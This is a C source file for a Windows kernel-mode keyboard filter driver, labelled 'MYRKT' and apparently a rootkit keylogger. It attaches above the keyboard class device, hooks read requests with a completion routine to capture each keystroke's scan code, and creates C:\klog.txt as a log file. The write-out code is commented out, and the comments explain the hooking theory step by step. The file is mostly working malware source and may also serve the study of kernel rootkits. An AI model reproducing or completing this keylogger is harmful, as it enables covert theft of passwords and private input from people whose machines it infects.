#include "klog.h"

int numPendingIrps = 0;
BOOL first_enter = TRUE;

//@@@@@@@@@@@@@@@@@@@@@@@@ 
// IRQL = DISPATCH_LEVEL 
//@@@@@@@@@@@@@@@@@@@@@@@@@ 
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context)
{
	Ktrace("(MYRKT)Entering OnReadCompletion Routine...\n");

	//get the device extension - we'll need to use it later 
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	//if the request has completed, extract the value of the key 
	if (pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		for (int i = 0; i < numKeys; i++)
		{
			Ktrace("(MYRKT)ScanCode: %x\n", keys[i].MakeCode);

			if (keys[i].Flags == KEY_BREAK)
				Ktrace("(MYRKT)%s\n", "Key Up");

			if (keys[i].Flags == KEY_MAKE)
				Ktrace("(MYRKT)%s\n", "Key Down");

			////////////////////////////////////////////////////////////////// 
			// NOTE: The file I/O routines must run at IRQL = PASSIVE_LEVEL 
			// and Completion routines can be called at IRQL = DISPATCH_LEVEL. 
			// Deferred Procedure Calls also run at IRQL = DISPATCH_LEVEL. This 
			// makes it necessary for us to set up and signal a worker thread 
			// to write the data out to disk. The worker threads run at IRQL_ 
			// PASSIVE level so we can do the file I/O from there. 
			///////////////////////////////////////////////////////////////// 

			//////////////////////////////////////////////////////////////// 
			// Here we allocate a block of memory to hold the keyboard scan 
			// code at attach it to an interlocked linked list.  The interlocked 
			// list provides synchronized access to the list by using a  
			// spin lock (initialized in DriverEntry).  Also, note that because 
			// we are running at IRQL_DISPATCH level, any memory allocation 
			// must be done from the non paged pool.  
			/////////////////////////////////////////////////////////////// 

			/////////////////////////////////////////////////////////////// 
			// Allocate Memory 
			// NOTE: Direct allocation of these small blocks will eventually 
			// fragment the non paged pool. A better memory management stragegy 
			// would be to allocate memory using a non paged lookaside list. 
			////////////////////////////////////////////////////////////////// 

			//KEY_DATA* kData = (KEY_DATA*)ExAllocatePoolWithTag(NonPagedPool, sizeof(KEY_DATA), "tag1");

			//fill in kData structure with info from IRP 
			//kData->KeyData = (char)keys[i].MakeCode;
			//kData->KeyFlags = (char)keys[i].Flags;

			//Add the scan code to the linked list queue so our worker thread 
			//can write it out to a file. 
			//Ktrace("(MYRKT)Adding IRP to work queue...");
			//ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead, &kData->ListEntry, &pKeyboardDeviceExtension->lockQueue);

			//Increment the semaphore by 1 - no WaitForXXX after this call 
			//KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue, 0, 1, FALSE);

		}//end for 
	}//end if 

	//Mark the Irp pending if necessary 
	if (pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	//Remove the Irp from our own count of tagged (pending) IRPs 
	numPendingIrps--;

	return pIrp->IoStatus.Status;
}//end OnReadCompletion

NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
{
	Ktrace("(MYRKT)Entering DispatchPassDown Routine...\n");
	//pass the irp down to the target without touching it 
	IoSkipCurrentIrpStackLocation(Irp);
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, Irp);
}

//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
// THE THEORY BEHIND THE HOOK: 
// 1. The Operating System sends an empty IRP packet down the device stack for the keyboard. 
// 
// 2. The IRP is intercepted by the ReadDispatcher routine in the filter driver. While in 
//	  this routine, the IRP is "tagged" with a "completion routine".  This is a callback routine  
//	  which basically says "I want another go at this packet later when its got some data". 
//	  ReadDispatcher then sends the IRP on it's down the device stack to the drivers underneath. 
// 
// 3. When the tagged, empty IRP reaches the bottom of the stack at the hardware / software  
//	  interface, it waits for a keypress. 
// 
// 4. When a key on the keyboard is pressed, the IRP is filled with the scan code for the  
//	  pressed key and sent on its way back up the device stack. 
// 
// 5. On its way back up the device stack, the completion routines that the IRP was tagged 
//    with on its way down the stack are called and the IRP is packed passed into them. This  
//    gives the filter driver an opportunity to extract the scan code information stored  
//	  in the packet from the user's key press. 
// 
// NOTE: Other IRPs other than IRP_MJ_READ are simply passed down to the drivers underneath 
//		without modification. 
// 
// 
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 

//@@@@@@@@@@@@@@@@@@@@@@@@ 
// IRQL = passive level 
//@@@@@@@@@@@@@@@@@@@@@@@@@ 
NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
{
	//	__asm int 3; 
	Ktrace("(MYRKT)Entering Hook Routine...\n");

	//the filter device object 
	PDEVICE_OBJECT pKeyboardDeviceObject;

	//Create a keyboard device object 
	NTSTATUS status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, //no name 
		FILE_DEVICE_KEYBOARD, 0, TRUE, &pKeyboardDeviceObject);

	//Make sure the device was created ok 
	if (!NT_SUCCESS(status))
		return status;

	Ktrace("(MYRKT)Created keyboard device successfully...\n");

	////////////////////////////////////////////////////////////////////////////////// 
	//Copy the characteristics of the target keyboard driver into the  filter device  
	//object because we have to mirror the keyboard device underneath us. 
	//These characteristics can be determined by examining the target driver using an 
	//application like DeviceTree in the DDK 
	////////////////////////////////////////////////////////////////////////////////// 
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
	Ktrace("(MYRKT)Flags set succesfully...\n");

	////////////////////////////////////////////////////////////////////////////////////////////// 
	//Initialize the device extension - The device extension is a custom defined data structure 
	//for our driver where we can store information which is guaranteed to exist in nonpaged memory. 
	/////////////////////////////////////////////////////////////////////////////////////////////// 
	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	Ktrace("(MYRKT)Device Extension Initialized...\n");

	//Get the pointer to the device extension 
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;

	////////////////////////////////////////////////////////////////////////////////////////////// 
	//Insert the filter driver onto the device stack above the target keyboard driver underneath and 
	//save the old pointer to the top of the stack. We need this address to direct IRPS to the drivers 
	//underneath us on the stack. 
	/////////////////////////////////////////////////////////////////////////////////////////////// 
	CCHAR		 ntNameBuffer[64] = "\\Device\\KeyboardClass0";
	STRING		 ntNameString;
	UNICODE_STRING uKeyboardDeviceName;
	RtlInitAnsiString(&ntNameString, ntNameBuffer);
	RtlAnsiStringToUnicodeString(&uKeyboardDeviceName, &ntNameString, TRUE);
	IoAttachDevice(pKeyboardDeviceObject, &uKeyboardDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
	RtlFreeUnicodeString(&uKeyboardDeviceName);
	Ktrace("(MYRKT)Filter Device Attached Successfully...\n");

	return STATUS_SUCCESS;
}//end HookKeyboard  

/*****************************************************************************************************
// This is the acutal hook routine which we will redirect the keyboard's read IRP's to
//
// NOTE: The DispatchRead, DispatchWrite, and DispatchDeviceControl routines of lowest-level device
// drivers, and of intermediate drivers layered above them in the system paging path, can be called at
// IRQL = APC_LEVEL and in an arbitrary thread context. The DispatchRead and/or DispatchWrite routines,
// and any other routine that also processes read and/or write requests in such a lowest-level device
// or intermediate driver, must be resident at all times. These driver routines can neither be pageable
// nor be part of a driver's pageable-image section; they must not access any pageable memory. Furthermore,
// they should not be dependent on any blocking calls (such as KeWaitForSingleObject with a nonzero
// time-out).
*******************************************************************************************************/
//@@@@@@@@@@@@@@@@@@@@@@@@ 
// IRQL = DISPATCH_LEVEL 
//@@@@@@@@@@@@@@@@@@@@@@@@@ 
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{

	///////////////////////////////////////////////////////////////////////// 
	//NOTE: The theory is that empty keyboard IRP's are sent down through 
	//the device stack where they wait until a key is pressed. The keypress 
	//completes the IRP. It is therefore necessary to capture the empty 
	//IRPS on the way down to the keyboard and "tag" them with a callback 
	//function which will be called whenever a key is pressed and the IRP is 
	//completed. We "tag" them by setting a "completion routine" using the 
	//kernel API IoSetCompletionRoutine 
	//////////////////////////////////////////////////////////////////////// 
	Ktrace("(MYRKT)Entering DispatchRead Routine...\n");

	//Each driver that passes IRPs on to lower drivers must set up the stack location for the  
	//next lower driver. A driver calls IoGetNextIrpStackLocation to get a pointer to the next-lower 
	//driver’s I/O stack location 
	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
	*nextIrpStack = *currentIrpStack;

	//Set the completion callback 
	IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);

	//track the # of pending IRPs 
	numPendingIrps++;

	Ktrace("(MYRKT)Tagged keyboard 'read' IRP... Passing IRP down the stack... \n");

	//Pass the IRP on down to the driver underneath us 
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);

}//end DispatchRead


NTSTATUS Klog_Onload(IN PDRIVER_OBJECT theDriverObject,
	IN PUNICODE_STRING theRegistryPath)
{
	NTSTATUS Status = { 0 };

	Ktrace("(MYRKT)Keyboard Filter Driver - DriverEntry\nCompiled at " __TIME__ " on " __DATE__ "\n");

	///////////////////////////////////////////////////////////////////////////////////////// 
	// Fill in IRP dispatch table in the DriverObject to handle I/O Request Packets (IRPs)  
	///////////////////////////////////////////////////////////////////////////////////////// 

	// For a filter driver, we want pass down ALL IRP_MJ_XX requests to the driver which 
	// we are hooking except for those we are interested in modifying. 
	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
		theDriverObject->MajorFunction[i] = DispatchPassDown;
	}
	Ktrace("(MYRKT)Filled dispatch table with generic pass down routine...\n");

	//Explicitly fill in the IRP's we want to hook 
	theDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;

	//Go ahead and hook the keyboard now 
	HookKeyboard(theDriverObject);
	Ktrace("(MYRKT)Hooked IRP_MJ_READ routine...\n");

	//Set up our worker thread to handle file writes of the scan codes extracted from the  
	//read IRPs 
	//InitThreadKeyLogger(theDriverObject);

	//Initialize the linked list that will serve as a queue to hold the captured keyboard scan codes 
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)theDriverObject->DeviceObject->DeviceExtension;
	//InitializeListHead(&pKeyboardDeviceExtension->QueueListHead);

	//Initialize the lock for the linked list queue 
	//KeInitializeSpinLock(&pKeyboardDeviceExtension->lockQueue);

	//Initialize the work queue semaphore 
	//KeInitializeSemaphore(&pKeyboardDeviceExtension->semQueue, 0, MAXLONG);

	//Create the log file 
	IO_STATUS_BLOCK file_status;
	OBJECT_ATTRIBUTES obj_attrib;
	CCHAR		 ntNameFile[64] = "\\DosDevices\\c:\\klog.txt";
	STRING		 ntNameString;
	UNICODE_STRING uFileName;
	RtlInitAnsiString(&ntNameString, ntNameFile);
	RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, TRUE);
	InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	Status = ZwCreateFile(&pKeyboardDeviceExtension->hLogFile, GENERIC_WRITE, &obj_attrib, &file_status,
		NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	RtlFreeUnicodeString(&uFileName);

	if (Status != STATUS_SUCCESS) {
		Ktrace("(MYRKT)Failed to create log file...\n");
		Ktrace("(MYRKT)File Status = %x\n", file_status);
	}else {
		Ktrace("(MYRKT)Successfully created log file...\n");
		Ktrace("(MYRKT)File Handle = %x\n", pKeyboardDeviceExtension->hLogFile);
	}

	//IoBuildAsynchronousFsdRequest(IRP_MJ_READ, theDriverObject->DeviceObject)

	Ktrace("(MYRKT)Exiting Driver Entry......\n");
	return STATUS_SUCCESS;
}
VOID Klog_OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)DriverObject->DeviceObject->DeviceExtension;
	Ktrace("(MYRKT)Driver Unload Called...\n");

	//Detach from the device underneath that we're hooked to 
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	Ktrace("(MYRKT)Keyboard hook detached from device...\n");

	/////////////////////////////////////////////////////////////// 
	//Wait for our tagged IRPs to die before we remove the device 
	/////////////////////////////////////////////////////////////// 
	Ktrace("(MYRKT)There are %d tagged IRPs\n", numPendingIrps);
	Ktrace("(MYRKT)Waiting for tagged IRPs to die...\n");

	//Create a timer 
	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	timeout.QuadPart = 1000000; //.1 s 
	KeInitializeTimer(&kTimer);

	while (numPendingIrps > 0)
	{
		//Set the timer 
		KeSetTimer(&kTimer, timeout, NULL);
		//NdisMSleep(1000);
		KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);
	}

	//Set our key logger worker thread to terminate 
	pKeyboardDeviceExtension->bThreadTerminate = TRUE;

	//Wake up the thread if its blocked & WaitForXXX after this call 
	//KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue, 0, 1, TRUE);

	//Wait till the worker thread terminates	 
	Ktrace("(MYRKT)Waiting for key logger thread to terminate...\n");
	//KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj, Executive, KernelMode, FALSE, NULL);
	Ktrace("(MYRKT)Key logger thread termintated\n");

	//Close the log file 
	ZwClose(pKeyboardDeviceExtension->hLogFile);

	//Delete the device 
	IoDeleteDevice(DriverObject->DeviceObject);
	Ktrace("(MYRKT)Tagged IRPs dead...Terminating...\n");

	return;
}